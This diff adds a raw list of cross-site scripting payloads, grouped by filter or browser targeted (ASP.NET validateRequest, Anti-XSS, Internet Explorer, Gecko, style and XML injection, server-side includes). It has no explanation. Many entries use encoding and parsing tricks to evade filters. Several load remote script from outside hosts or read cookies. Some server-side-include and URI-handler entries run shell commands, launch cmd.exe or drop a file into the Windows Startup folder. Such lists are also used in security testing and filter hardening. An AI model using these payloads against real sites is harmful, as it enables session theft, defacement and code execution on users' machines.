@@ -1,0 +1,201 @@
+ASP .NET validateRequest
+  1: </XSS STYLE=xss:expression(alert('XSS'))>
+  2: XSS STYLE=xss:e/**/xpression(alert('XSS'))>
+  3: XSS-STYLE=xss:e/**/xpression(alert('XSS'))>
+  4: XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
+  5: "><script>alert('XSS')</script>
+
+JSON
+  1: <body onload=;a2={y:eval};a1={x:a2.y('al'+'ert')};;;;;;;;;_=a1.x;_(1);;;;
+  2: <body onload=a1={x:this.parent.document};a1.x.writeln(1);>
+  3: <body onload=;a1={x:document};;;;;;;;;_=a1.x;_.write(1);;;;
+  4: <body/s/onload=x={doc:parent.document};x.doc.writeln(1)
+  5: <body/????$/onload=x={doc:parent[document]};x.doc.writeln(1)
+
+MS Anti-XSS lib_v3.0
+  1: &#60;SCRIPT&#62;alert&#40;&#39;XSS&#39;&#41;&#60;&#47;SCRIPT&#62;
+  2: &#60;SCRIPT SRC&#61;http&#58;&#47;&#47;testsite.com&#47;xss.js&#62;&#60;&#47;SCRIPT&#62;
+  3: &#60;SCRIPT&#62;alert&#40;String.fromCharCode&#40;88,83,83&#41;&#41;&#60;&#47;SCRIPT&#62;
+  4: &#60;BASE HREF&#61;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#47;&#47;&#34;&#62;
+  5: &#60;BGSOUND SRC&#61;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;
+  6: &#60;BODY BACKGROUND&#61;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;
+  7: &#60;BODY ONLOAD&#61;alert&#40;&#39;XSS&#39;&#41;&#62;
+  8: &#60;DIV STYLE&#61;&#34;background-image&#58; url&#40;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#41;&#34;&#62;
+  9: &#60;DIV STYLE&#61;&#34;background-image&#58; url&#40;&#38;&#35;1&#59;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#41;&#34;&#62;
+  10: &#60;DIV STYLE&#61;&#34;width&#58; expression&#40;alert&#40;&#39;XSS&#39;&#41;&#41;&#59;&#34;&#62;
+  11: &#60;FRAMESET&#62;&#60;FRAME SRC&#61;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;&#60;&#47;FRAMESET&#62;
+  12: &#60;IFRAME SRC&#61;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;&#60;&#47;IFRAME&#62;
+  13: &#60;INPUT TYPE&#61;&#34;IMAGE&#34; SRC&#61;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;
+  14: &#60;IMG SRC&#61;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;
+  15: &#60;IMG SRC&#61;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#62;
+  16: &#60;IMG DYNSRC&#61;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;
+  17: &#60;IMG LOWSRC&#61;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;
+  18: &#60;IMG SRC&#61;&#34;http&#58;&#47;&#47;www.thesiteyouareon.com&#47;somecommand.php&#63;somevariables&#61;maliciouscode&#34;&#62;
+  19: &#60;STYLE&#62;li &#123;list-style-image&#58; url&#40;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#34;&#41;&#59;&#125;&#60;&#47;STYLE&#62;&#60;UL&#62;&#60;LI&#62;XSS
+  20: &#60;IMG SRC&#61;&#39;vbscript&#58;msgbox&#40;&#34;XSS&#34;&#41;&#39;&#62;
+  21: &#60;LAYER SRC&#61;&#34;http&#58;&#47;&#47;testsite.com&#47;scriptlet.html&#34;&#62;&#60;&#47;LAYER&#62;
+  22: &#60;IMG SRC&#61;&#34;livescript&#58;&#91;code&#93;&#34;&#62;
+  23: &#37;BCscript&#37;BEalert&#40;&#37;A2XSS&#37;A2&#41;&#37;BC&#47;script&#37;BE
+  24: &#60;META HTTP-EQUIV&#61;&#34;refresh&#34; CONTENT&#61;&#34;0&#59;url&#61;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;
+  25: &#60;META HTTP-EQUIV&#61;&#34;refresh&#34; CONTENT&#61;&#34;0&#59;url&#61;data&#58;text&#47;html&#59;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&#34;&#62;
+  26: &#60;META HTTP-EQUIV&#61;&#34;refresh&#34; CONTENT&#61;&#34;0&#59; URL&#61;http&#58;&#47;&#47;&#59;URL&#61;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;
+  27: &#60;IMG SRC&#61;&#34;mocha&#58;&#91;code&#93;&#34;&#62;
+  28: &#60;STYLE TYPE&#61;&#34;text&#47;javascript&#34;&#62;alert&#40;&#39;XSS&#39;&#41;&#59;&#60;&#47;STYLE&#62;
+  29: &#60;IMG STYLE&#61;&#34;xss&#58;expr&#47;&#42;XSS&#42;&#47;ession&#40;alert&#40;&#39;XSS&#39;&#41;&#41;&#34;&#62;
+  30: &#60;XSS STYLE&#61;&#34;xss&#58;expression&#40;alert&#40;&#39;XSS&#39;&#41;&#41;&#34;&#62;
+  ...
+
+Server Side Includes
+  1: <!--#exec cmd="/bin/echo '<SCRIPT SRC'"--><!--#exec cmd="/bin/echo '=http://ha.ckers.org/xss.js></SCRIPT>'"-->
+  2: <!--#exec cmd=""/usr/X11R6/bin/xterm ?display 127.0.0.1:0 &""-->
+
+URI Cross Site Scripting
+  1: aim: &c:\windows\system32\calc.exe" ini="C:\Documents and Settings\All Users\Start Menu\Programs\Startup\pwnd.bat"
+  2: firefoxurl:test|"%20-new-window%20javascript:alert(\'Cross%2520Browser%2520Scripting!\');"
+  3: navigatorurl:test" -chrome "javascript:C=Components.classes;I=Components.interfaces;file=C[\'@mozilla.org/file/local;1\'].createInstance(I.nsILocalFile);file.initWithPath(\'C:\'+String.fromCharCode(92)+String.fromCharCode(92)+\'Windows\'+String.fromCharCode(92)+String.fromCharCode(92)+\'System32\'+String.fromCharCode(92)+String.fromCharCode(92)+\'cmd.exe\');process=C[\'@mozilla.org/process/util;1\'].createInstance(I.nsIProcess);process.init(file);process.run(true%252c{}%252c0);alert(process)
+  4: res://c:\\program%20files\\adobe\\acrobat%207.0\\acrobat\\acrobat.dll/#2/#210
+
+URL Breaking
+  1: httP://aa"><script>alert(123)</script>
+  2: httP://aa'><script>alert(123)</script>
+  3: httP://aa<script>alert(123)</script>
+
+XSS 101
+  1: <script>alert('xss')</script>
+  2: <script>alert(string.fromcharcode(88,83,83))</script>
+  3: </title><script>alert(1)</script>
+  4: '> <script>alert(3)</script>
+  5: `> <script>alert(5)</script>
+  6: > <script>alert(4)</script>
+  7: </title><script>alert(1)</script>
+  8: <<script>alert("xss");//<</script>
+  9: >"'
+
+XSS 102
+  1: '';!--"<XSS>=&{()}
+  2: */a=eval;b=alert;a(b(/e/.source));/*
+  3: '%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e'
+  4: <SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
+  5: %26%2339);x=alert;x(%26%2340 /finally through!/.source %26%2341);//
+  6: </noscript><br><code onmouseover=a=eval;b=alert;a(b(/h/.source));>MOVE MOUSE OVER THIS AREA</code>
+  7: <IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+  8: <BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert("XSS")>
+  9: perl -e 'print "<SCR\0IPT>alert("XSS")</SCR\0IPT>";' > out
+  10: <DIV STYLE="background-image: url(http://ha.ckers.org/xss.js)">Div Body</DIV> 
+
+XSS Embed/Evade
+  1: <EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>
+  2: <SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+  3: <SCRIPT ="blah" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+  4: <SCRIPT a="blah" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+  5: <SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+  6: <SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+  7: <SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+  8: <SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+  9: <SCRIPT SRC=http://ha.ckers.org/xss.js
+  10: <SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+
+XSS Gecko
+  1: (1?(1?{a:1?""[1?"ev\a\l":0](1?"\a\lert":0):0}:0).a:0)[1?"\c\a\l\l":0](content,1?"x\s\s":0)
+  2: <STYLE TYPE="text/javascript">alert('XSS');</STYLE>
+  3: <SCRIPT SRC=http://ha.ckers.org/xss.js
+  4: <A HREF="http://google:ha.ckers.org">XSS</A>
+  5: <A HREF="http://ha.ckers.org@google">XSS</A>
+  6: <A HREF="//google">XSS</A>
+  7: <IFRAME SRC=http://ha.ckers.org/scriptlet.html <
+  8: y=<a>alert</a>;content[y](123)
+  9: sstyle=foobar"tstyle="foobar"ystyle="foobar"lstyle="foobar"estyle="foobar"=-moz-binding:url(http://h4k.in/mozxss.xml#xss)>foobar</b>#xss)" a="
+  10: with(document.__parent__)alert(1)
+  11: style=-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="
+
+XSS HTML Breaking
+  1: <s>000<s>%3cs%3e111%3c/s%3e%3c%73%3e%32%32%32%3c%2f%73%3e&#60&#115&#62&#51&#51&#51&#60&#47&#115&#62&#x3c&#x73&#x3e&#x34&#x34&#x34&#x3c&#x2f&#x73&#x3e
+  2: ';alert(0)//\';alert(1)//";alert(2)//\";alert(3)//--></SCRIPT>">'><SCRIPT>alert(4)</SCRIPT>=&{}");}alert(6);function xss(){//
+  3: ';alert(0)//\';alert(1)//";alert(2)//\";alert(3)//--></SCRIPT>">'></title><SCRIPT>alert(4)</SCRIPT>=&{</title><script>alert(5)</script>}");}
+  4: '';!--"<script>alert(0);</script>=&{(alert(1))}
+  5: </title><script>alert(1)</script>
+  6: </textarea><br><code onmouseover=a=eval;b=alert;a(b(/g/.source));>MOVE MOUSE OVER THIS AREA</code>
+  7: '';!--"<XSS>=&{()}
+
+XSS Image Tag
+  1: <IMG SRC=javascript:alert('XSS')>
+  2: <IMG SRC=JaVaScRiPt:alert('XSS')>
+  3: <IMG SRC=`javascript:alert("XSS says, 'XSS'")`>
+  4: <IMG """><SCRIPT>alert("XSS")</SCRIPT>">",
+  5: <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+  6: <IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+  7: <IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+  8: <IMG SRC="jav&#x0D;ascript:alert('XSS');">
+  9: <IMG SRC="jav&#x09;ascript:alert(<WBR>'XSS');">
+  10: <IMG SRC="jav&#x0A;ascript:alert(<WBR>'XSS');">
+
+XSS Internet Explorer
+  1: <img src=`x` onrerror= ` ;; alert(1) ` />
+  2: </a style=""xx:expr/**/ession(document.appendChild(document.createElement('script')).src='http://h4k.in/i.js')">
+  3: style=color: expression(alert(0));" a="
+  4: vbscript:Execute(MsgBox(chr(88)&chr(83)&chr(83)))<
+  5: width: expression((window.r==document.cookie)?'':alert(r=document.cookie))
+  6: <!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->
+  7: <DIV STYLE="width: expression(alert('XSS'));">
+  8: <IMG SRC="jav&#x0A;ascript:alert('XSS');">
+  9: <IMG SRC="javascript:alert('XSS');">
+  10: <FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
+  11: <IMG SRC=`javascript:alert("RSnake says### 'XSS'")`>
+  12: <IMG SRC="javascript:alert('XSS')"
+  13: <IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+  14: <IMG SRC=javascript:alert(&quot;XSS&quot;)>
+  15: <IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+  16: <IMG SRC=javascript:alert(String.fromCharCode(88###83###83))>
+  17: <IMG DYNSRC="javascript:alert('XSS');">
+  18: <IMG LOWSRC="javascript:alert('XSS');">
+  19: <IMG SRC=javascript:alert('XSS')>
+  20: exp/*<XSS STYLE='no\xss:noxss("*//*");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("XSS"))'>
+  21: <IMG SRC="javascript:alert('XSS');">
+  22: <IMG SRC='vbscript:msgbox("XSS")'>
+  23: <INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+  24: <STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS
+  25: <XSS STYLE="behavior: url(http://ha.ckers.org/xss.htc);">
+  26: <IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+  27: <IMGSRC="javascript:alert('XSS')">
+  28: <OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>
+  29: <IMG SRC=" &#14;  javascript:alert('XSS');">
+  30: <XSS STYLE="xss:expression(alert('XSS'))">
+  ...
+
+XSS JS Breaks
+  1: alert(1)
+  2: A=alert;A(1)
+  3: +alert(0)+
+  4: ';//%0da=eval;b=alert;a(b(9));//
+  5: a=1;a=eval;b=alert;a(b(11));//
+  6: '};a=eval;b=alert;a(b(13));//
+  7: 1};a=eval;b=alert;a(b(14));//
+  8: '];a=eval;b=alert;a(b(15));//
+  9: 1];a=eval;b=alert;a(b(17));//
+  10: 1;a=eval;b=alert;a(b(/c/.source));
+  11: xyz onerror=alert(6);
+
+XSS Style Injection
+  1: style=color: expression(alert(0));" a="
+  2: style=-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="
+  3: width: expression((window.r==document.cookie)?'':alert(r=document.cookie))
+  4: sstyle=foobar"tstyle="foobar"ystyle="foobar"lstyle="foobar"estyle="foobar"=-moz-binding:url(http://h4k.in/mozxss.xml#xss)>foobar</b>#xss)" a="
+  5: <DIV STYLE="background-image: url(javascript:alert('XSS'))">
+  6: <DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
+  7: <DIV STYLE="width: expression(alert('XSS'));">
+  8: <FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
+  9: <STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
+  10: <STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
+  11: <STYLE TYPE="text/javascript">alert('XSS');</STYLE>
+  12: <STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
+  13: <STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+  14: <IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+
+XSS XML Injection
+  1: <xml id=i><x><c><![cdata[<img src="javas]]><![cdata[cript:alert('xss');">]]></c></x></xml><span datasrc=#i datafld=c dataformatas=html>
+  2: <xml id="xss"><i><b><img src="javas<!-- -->cript:alert('xss')"></b></i></xml><span datasrc="#xss" datafld="b" dataformatas="html"></span>
+  3: <html><body><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributename="innerhtml" to="xss<script defer>alert('xss')</script>"> </body></html>
+  4: <html xmlns:xss><?import namespace="xss" implementation="httP://ha.ckers.org/xss.htc"><xss:xss>xss</xss:xss></html>
+  5: <xml src="httP://ha.ckers.org/xsstest.xml" id=i></xml><span datasrc=#i datafld=c dataformatas=html></span>
+  6: <?xml version="1.0"?><html:html xmlns:html='httP://www.w3.org/1999/xhtml'><html:script>alert(document.cookie);</html:script></html:html>
+
